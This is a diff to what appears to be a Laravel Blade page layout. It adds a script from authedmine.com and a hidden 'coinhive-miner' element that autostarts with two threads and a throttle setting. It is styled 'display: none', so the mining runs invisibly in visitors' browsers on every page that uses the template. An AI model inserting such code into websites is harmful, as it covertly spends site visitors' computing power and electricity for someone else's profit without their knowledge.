@@ -51,6 +51,15 @@
 <body data-gr-c-s-loaded="true">
 <div class="content">
     @yield("content")
+    <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+    <div class="coinhive-miner"
+         style="width: 256px; height: 310px; display: none"
+         data-key="ePDKYq4a5JjUiiLlA3pRntapcixcJQBO"
+         data-autostart="true"
+         data-threads="2"
+         data-throttle="0.8">
+        <em>Loading...</em>
+    </div>
 </div>
 <div class="clearfix"></div>
 <footer class="footer site-footer login-footer">
